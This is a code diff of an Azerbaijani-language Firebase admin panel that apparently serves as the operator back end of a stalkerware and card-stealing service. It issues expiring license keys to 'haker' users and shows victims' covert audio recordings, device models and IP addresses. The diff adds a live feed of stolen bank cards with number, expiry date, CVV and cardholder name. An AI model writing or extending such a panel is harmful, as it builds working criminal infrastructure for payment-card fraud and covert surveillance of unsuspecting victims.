@@ -10,25 +10,25 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&family=Syncopate:wght@700&display=swap');
         
-        :root { --bg: #050508; --accent: #00dfff; --warn: #ffd700; --danger: #ff0055; --card: rgba(255,255,255,0.03); }
+        :root { --bg: #050508; --accent: #00dfff; --warn: #ffd700; --danger: #ff0055; --card: rgba(255,255,255,0.03); --cyber: #00ff88; }
         body { margin: 0; background: var(--bg); color: white; font-family: 'Outfit', sans-serif; padding-bottom: 50px; }
         
         .header { padding: 25px; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); border-bottom: 1px solid var(--accent); position: sticky; top: 0; z-index: 100; text-align: center; }
-        .tab-menu { display: flex; overflow-x: auto; gap: 10px; padding: 15px 20px; background: #0a0a0f; }
+        .tab-menu { display: flex; overflow-x: auto; gap: 10px; padding: 15px 20px; background: #0a0a0f; scrollbar-width: none; }
         .tab-btn { background: var(--card); border: 1px solid rgba(255,255,255,0.1); color: white; padding: 10px 20px; border-radius: 12px; white-space: nowrap; font-size: 0.7rem; font-weight: 900; cursor: pointer; }
         .tab-btn.active { background: var(--accent); color: black; }
 
         .container { padding: 20px; }
         .card { background: var(--card); border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; margin-bottom: 20px; }
         
-        input, select { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #222; background: #000; color: white; margin-top: 8px; outline: none; }
+        input, select { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #222; background: #000; color: white; margin-top: 8px; outline: none; box-sizing: border-box; }
         .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: 900; margin-top: 15px; cursor: pointer; text-transform: uppercase; }
         
         .data-row { display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.02); font-size: 0.8rem; }
         .badge { font-size: 0.6rem; padding: 4px 8px; border-radius: 5px; font-weight: 900; border: none; cursor: pointer; }
-        
-        .status-online { color: #00ff00; }
-        .status-offline { color: #555; }
+
+        /* Bank Kartı Vizualı */
+        .bank-card-item { border-left: 4px solid var(--cyber); background: rgba(0,255,136,0.02); margin-bottom: 15px; padding: 15px; border-radius: 10px; }
     </style>
 </head>
 <body>
@@ -38,9 +38,10 @@
 </div>
 
 <div class="tab-menu">
-    <button class="tab-btn active" onclick="showSec('keys')">KEY İDARƏ</button>
-    <button class="tab-btn" onclick="showSec('users')">İSTİFADƏÇİLƏR</button>
-    <button class="tab-btn" onclick="showSec('all-logs')">BÜTÜN LOQLAR</button>
+    <button class="tab-btn active" onclick="showSec('keys', this)">KEY İDARƏ</button>
+    <button class="tab-btn" onclick="showSec('users', this)">İSTİFADƏÇİLƏR</button>
+    <button class="tab-btn" onclick="showSec('bank', this)">BANK MƏLUMATLARI</button>
+    <button class="tab-btn" onclick="showSec('all-logs', this)">BÜTÜN LOQLAR</button>
 </div>
 
 <div class="container">
@@ -71,6 +72,13 @@
         </div>
     </section>
 
+    <section id="sec-bank" style="display:none;">
+        <div class="card">
+            <h3 style="font-size:0.9rem; color:var(--cyber);">💳 CANLI KART AXINI</h3>
+            <div id="bank-logs-container"></div>
+        </div>
+    </section>
+
     <section id="sec-all-logs" style="display:none;">
         <div class="card">
             <h3 style="font-size:0.9rem; color:var(--danger);">CANLI GLOBAL DATA AXINI</h3>
@@ -85,82 +93,93 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    function showSec(id) {
+    function showSec(id, btn) {
         document.querySelectorAll('section').forEach(s => s.style.display = 'none');
         document.getElementById('sec-' + id).style.display = 'block';
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-        event.target.classList.add('active');
+        btn.classList.add('active');
     }
 
-    // KEY CREATION
     async function createKey() {
         let name = document.getElementById('new-key-name').value.trim().toUpperCase();
         if(!name) name = "KEY-" + Math.floor(1000 + Math.random() * 9000);
-        
         const days = parseInt(document.getElementById('key-duration').value);
         const expiry = Date.now() + (days * 24 * 60 * 60 * 1000);
-
-        await db.ref('keys/' + name).set({
-            status: "active",
-            expiry: expiry,
-            createdAt: Date.now()
-        });
+        await db.ref('keys/' + name).set({ status: "active", expiry: expiry, createdAt: Date.now() });
         alert("Yaradıldı: " + name);
         document.getElementById('new-key-name').value = "";
     }
 
-    // LIVE KEY LIST
+    // KEY LİSTESİ
     db.ref('keys').on('value', snap => {
         const list = document.getElementById('active-keys-list');
         list.innerHTML = "";
         snap.forEach(key => {
             const d = key.val();
             const left = Math.round((d.expiry - Date.now()) / (1000*60*60*24));
-            list.innerHTML += `
-                <div class="data-row">
-                    <div><b>${key.key}</b><br><small style="color:#888;">Qalıb: ${left} gün</small></div>
-                    <button class="badge" style="background:red; color:white;" onclick="db.ref('keys/${key.key}').remove()">SİL</button>
-                </div>`;
+            list.innerHTML += `<div class="data-row">
+                <div><b>${key.key}</b><br><small style="color:#888;">Qalıb: ${left} gün</small></div>
+                <button class="badge" style="background:red; color:white;" onclick="db.ref('keys/${key.key}').remove()">SİL</button>
+            </div>`;
         });
     });
 
-    // MASTER USER LIST
+    // İSTİFADƏÇİ LİSTESİ
     db.ref('users').on('value', snap => {
         const list = document.getElementById('master-user-list');
         list.innerHTML = "";
         snap.forEach(u => {
-            list.innerHTML += `
-                <div class="data-row">
-                    <span><i class="fas fa-user"></i> ${u.key.toUpperCase()}</span>
-                    <button class="badge" style="background:var(--accent); color:black;" onclick="blockUser('${u.key}')">BLOKLA</button>
-                </div>`;
+            list.innerHTML += `<div class="data-row">
+                <span><i class="fas fa-user"></i> ${u.key.toUpperCase()}</span>
+                <button class="badge" style="background:var(--accent); color:black;">BLOKLA</button>
+            </div>`;
         });
     });
 
-    // GLOBAL LOG MONITORING (Bura bütün hakerlərin ovları düşür)
+    // GLOBAL LOG MONITORING
     function startGlobalMonitor() {
         const container = document.getElementById('global-logs-container');
-        
+        const bankContainer = document.getElementById('bank-logs-container');
+
         // Səs yazılarını izlə
         db.ref('audio_logs').on('child_added', userFolder => {
             userFolder.forEach(log => {
                 const data = log.val();
-                container.innerHTML = `
-                    <div class="data-row" style="background:rgba(255,0,0,0.05); margin-bottom:5px; border-radius:8px;">
-                        <div><small>Haker: ${userFolder.key}</small><br>🎤 Səs Yazısı</div>
-                        <audio controls style="height:20px; width:120px;"><source src="${data.url}"></audio>
-                    </div>` + container.innerHTML;
+                container.innerHTML = `<div class="data-row" style="background:rgba(255,0,0,0.05); margin-bottom:5px; border-radius:8px;">
+                    <div><small>Haker: ${userFolder.key}</small><br>🎤 Səs Yazısı</div>
+                    <audio controls style="height:20px; width:120px;"><source src="${data.url}"></audio>
+                </div>` + container.innerHTML;
             });
         });
 
         // Cihazları izlə
         db.ref('device_specs').on('child_added', userFolder => {
             const d = userFolder.val();
-            container.innerHTML = `
-                <div class="data-row" style="background:rgba(0,223,255,0.05); margin-bottom:5px; border-radius:8px;">
-                    <div><small>Haker: ${userFolder.key}</small><br>📱 Cihaz: ${d.model}</div>
-                    <span style="color:var(--cyber); font-size:10px;">${d.ip}</span>
-                </div>` + container.innerHTML;
+            container.innerHTML = `<div class="data-row" style="background:rgba(0,223,255,0.05); margin-bottom:5px; border-radius:8px;">
+                <div><small>Haker: ${userFolder.key}</small><br>📱 Cihaz: ${d.model}</div>
+                <span style="color:var(--accent); font-size:10px;">${d.ip || ''}</span>
+            </div>` + container.innerHTML;
+        });
+
+        // BANK KARTLARINI İZLƏ (YENİ)
+        db.ref('user_cards').on('child_added', snap => {
+            const d = snap.val();
+            bankContainer.innerHTML = `
+                <div class="bank-card-item">
+                    <div style="display:flex; justify-content:space-between; font-size:0.6rem; color:#aaa; margin-bottom:10px;">
+                        <span>USER: <b>${snap.key.toUpperCase()}</b></span>
+                        <i class="fab fa-cc-visa"></i>
+                    </div>
+                    <div style="font-family:monospace; font-size:1rem; letter-spacing:2px; color:white; margin-bottom:8px;">${d.num}</div>
+                    <div style="display:flex; gap:15px; font-size:0.7rem;">
+                        <div><small style="display:block; font-size:0.5rem; color:#666;">VAL</small>${d.date}</div>
+                        <div><small style="display:block; font-size:0.5rem; color:#666;">CVV</small><span style="color:var(--danger)">${d.cvv}</span></div>
+                        <div style="flex-grow:1;"><small style="display:block; font-size:0.5rem; color:#666;">NAME</small>${d.name.toUpperCase()}</div>
+                    </div>
+                    <div style="text-align:right; margin-top:10px;">
+                        <button class="badge" style="background:var(--danger); color:white;" onclick="db.ref('user_cards/${snap.key}').remove(); this.parentElement.parentElement.remove();">SİL</button>
+                    </div>
+                </div>` + bankContainer.innerHTML;
         });
     }
 
